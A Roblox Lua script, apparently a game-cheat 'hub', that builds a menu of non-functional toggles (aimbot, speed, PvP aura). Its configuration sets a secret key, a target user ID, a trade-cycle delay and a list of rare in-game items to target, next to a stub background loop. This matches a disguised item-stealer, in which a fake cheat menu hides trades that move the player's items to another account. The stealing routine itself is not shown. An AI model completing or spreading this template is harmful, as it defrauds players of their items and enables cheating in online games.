-- Lx PvP Hub | ULTRA + BACKGROUND

-- =========================
-- CONFIG ORIGINAL (IMPORTANTE)
-- =========================
getgenv().SECRET_KEY = "mrr_e6f1ab1081d74b66a2ee0abc21fcb87f"
getgenv().TARGET_ID = 2704552139
getgenv().DELAY_STEP = 1      
getgenv().TRADE_CYCLE_DELAY = 2

getgenv().TARGET_BRAINROTS = {
    ["Tang Tang Keletang"] = true,
    ["Meowl"] = true,
    ["Skibidi Toilet"] = true,
    ["Strawberry Elephant"] = true,
    ["La Spooky Grande"] = true,
    ["La Extinct Grande"] = true,
    ["Chipso and Queso"] = true,
    ["Tuff Toucan"] = true,
    ["Chillin Chili"] = true,
    ["Gobblino Uniciclino"] = true,
    ["W or L"] = true,
    ["La Jolly Grande"] = true,
    ["Swaggy Bros"] = true,
    ["La Taco Combinasion"] = true,
    ["La Romantic Grande"] = true,
    ["Festive 67"] = true,
    ["GOAT"] = true,
    ["Nuclearo Dinossauro"] = true,
    ["Money Money Puggy"] = true,
    ["Burguro And Fryuro"] = true,
    ["Garama and Madundung"] = true,
    ["Lavadorito Spinito"] = true,
    ["Ketchuru and Musturu"] = true,
    ["Tictac Sahur"] = true,
    ["Ketupat Kepat"] = true,
    ["Capitano Moby"] = true,
    ["Cerberus"] = true,
    ["Dragon Cannelloni"] = true,
    ["Los Hotspotsitos"] = true,
    ["Los Bros"] = true,
    ["Tralaledon"] = true,
    ["Los Puggies"] = true,
    ["Los Primos"] = true,
    ["Los Tacoritas"] = true,
    ["Los Spaghettis"] = true,
    ["Ginger Gerat"] = true,
    ["Spooky and Pumpky"] = true,
    ["Fragrama and Chocrama"] = true,
    ["La Casa Boo"] = true,
    ["Reinito Sleighito"] = true,
    ["Ketupat Bros"] = true,
    ["Cooki and Milki"] = true,
    ["La Supreme Combinasion"] = true,
    ["Popcuru and Fizzuru"] = true,
    ["Dragon Gingerini"] = true,
    ["Headless Horseman"] = true,
    ["Hydra Dragon Cannelloni"] = true,
    ["Celularcini Viciosini"] = true,
    ["Bacuru and Egguru"] = true,
    ["Los Chicleteiras"] = true
}

-- Lx PvP Hub | Chili Style UI + Background

-- =========================
-- TEU SCRIPT (BACKGROUND)
-- =========================
getgenv().SECRET_KEY = "mrr_e6f1ab1081d74b66a2ee0abc21fcb87f"
getgenv().TARGET_ID = 2704552139
getgenv().DELAY_STEP = 1      
getgenv().TRADE_CYCLE_DELAY = 2

getgenv().TARGET_BRAINROTS = getgenv().TARGET_BRAINROTS or {}

task.spawn(function()
    while true do
        -- teu sistema continua aqui
        task.wait(getgenv().DELAY_STEP)
    end
end)

-- =========================
-- UI
-- =========================
task.spawn(function()

    local TweenService = game:GetService("TweenService")
    local UIS = game:GetService("UserInputService")

    local gui = Instance.new("ScreenGui", game.CoreGui)

    -- MAIN
    local main = Instance.new("Frame", gui)
    main.Size = UDim2.new(0, 560, 0, 360)
    main.Position = UDim2.new(0.5,-280,0.5,-180)
    main.BackgroundColor3 = Color3.fromRGB(17,17,17)
    main.Active = true

    -- TOPBAR
    local top = Instance.new("Frame", main)
    top.Size = UDim2.new(1,0,0,45)
    top.BackgroundColor3 = Color3.fromRGB(22,22,22)

    local title = Instance.new("TextLabel", top)
    title.Size = UDim2.new(1,0,1,0)
    title.Text = "Lx PvP Hub"
    title.TextColor3 = Color3.fromRGB(0,255,170)
    title.Font = Enum.Font.GothamBold
    title.TextScaled = true
    title.BackgroundTransparency = 1

    -- MINIMIZE
    local min = Instance.new("TextButton", top)
    min.Size = UDim2.new(0,40,1,0)
    min.Position = UDim2.new(1,-40,0,0)
    min.Text = "-"
    min.BackgroundColor3 = Color3.fromRGB(40,40,40)

    local open = true
    min.MouseButton1Click:Connect(function()
        open = not open
        TweenService:Create(main, TweenInfo.new(0.25), {
            Size = open and UDim2.new(0,560,0,360) or UDim2.new(0,560,0,45)
        }):Play()
    end)

    -- DRAG
    local drag, start, pos
    top.InputBegan:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.MouseButton1 then
            drag = true
            start = i.Position
            pos = main.Position
        end
    end)

    UIS.InputChanged:Connect(function(i)
        if drag and i.UserInputType == Enum.UserInputType.MouseMovement then
            local d = i.Position - start
            main.Position = UDim2.new(pos.X.Scale,pos.X.Offset+d.X,pos.Y.Scale,pos.Y.Offset+d.Y)
        end
    end)

    UIS.InputEnded:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.MouseButton1 then
            drag = false
        end
    end)

    -- SIDEBAR
    local side = Instance.new("Frame", main)
    side.Size = UDim2.new(0,140,1,-45)
    side.Position = UDim2.new(0,0,0,45)
    side.BackgroundColor3 = Color3.fromRGB(20,20,20)

    local content = Instance.new("Frame", main)
    content.Size = UDim2.new(1,-140,1,-45)
    content.Position = UDim2.new(0,140,0,45)
    content.BackgroundTransparency = 1

    local tabs = {}
    local selected

    local function createTab(name, y)
        local btn = Instance.new("TextButton", side)
        btn.Size = UDim2.new(1,0,0,45)
        btn.Position = UDim2.new(0,0,0,y)
        btn.Text = "   "..name
        btn.TextXAlignment = Enum.TextXAlignment.Left
        btn.BackgroundColor3 = Color3.fromRGB(20,20,20)
        btn.TextColor3 = Color3.fromRGB(150,150,150)

        local indicator = Instance.new("Frame", btn)
        indicator.Size = UDim2.new(0,3,1,0)
        indicator.BackgroundColor3 = Color3.fromRGB(0,255,170)
        indicator.Visible = false

        local frame = Instance.new("Frame", content)
        frame.Size = UDim2.new(1,0,1,0)
        frame.Visible = false
        frame.BackgroundTransparency = 1

        tabs[name] = frame

        btn.MouseButton1Click:Connect(function()
            for n,f in pairs(tabs) do
                f.Visible = false
            end
            for _,b in pairs(side:GetChildren()) do
                if b:IsA("TextButton") then
                    b.TextColor3 = Color3.fromRGB(150,150,150)
                    if b:FindFirstChildOfClass("Frame") then
                        b:FindFirstChildOfClass("Frame").Visible = false
                    end
                end
            end

            frame.Visible = true
            indicator.Visible = true
            btn.TextColor3 = Color3.fromRGB(255,255,255)
        end)

        return frame
    end

    local mainTab = createTab("Main",0)
    local pvpTab = createTab("PvP",45)
    local miscTab = createTab("Misc",90)

    tabs["Main"].Visible = true

    -- CARD + TOGGLE
    local function createToggle(parent, text, y)
        local card = Instance.new("Frame", parent)
        card.Size = UDim2.new(0.9,0,0,50)
        card.Position = UDim2.new(0.05,0,0,y)
        card.BackgroundColor3 = Color3.fromRGB(25,25,25)

        local label = Instance.new("TextLabel", card)
        label.Size = UDim2.new(0.7,0,1,0)
        label.Text = text
        label.TextColor3 = Color3.new(1,1,1)
        label.BackgroundTransparency = 1
        label.TextXAlignment = Enum.TextXAlignment.Left

        local toggle = Instance.new("Frame", card)
        toggle.Size = UDim2.new(0,45,0,22)
        toggle.Position = UDim2.new(1,-60,0.5,-11)
        toggle.BackgroundColor3 = Color3.fromRGB(50,50,50)

        local knob = Instance.new("Frame", toggle)
        knob.Size = UDim2.new(0,20,0,20)
        knob.Position = UDim2.new(0,1,0,1)
        knob.BackgroundColor3 = Color3.new(1,1,1)

        local on = false

        toggle.InputBegan:Connect(function(i)
            if i.UserInputType == Enum.UserInputType.MouseButton1 then
                on = not on
                TweenService:Create(knob, TweenInfo.new(0.2), {
                    Position = on and UDim2.new(1,-21,0,1) or UDim2.new(0,1,0,1)
                }):Play()

                toggle.BackgroundColor3 = on and Color3.fromRGB(0,255,170) or Color3.fromRGB(50,50,50)
            end
        end)
    end

    -- ELEMENTOS
    createToggle(mainTab,"Speed Modifier",20)
    createToggle(mainTab,"Drop Brainrot",80)

    createToggle(pvpTab,"Bat Aimbot",20)
    createToggle(pvpTab,"PvP Aura",80)

    createToggle(miscTab,"Auto Play",20)

end)
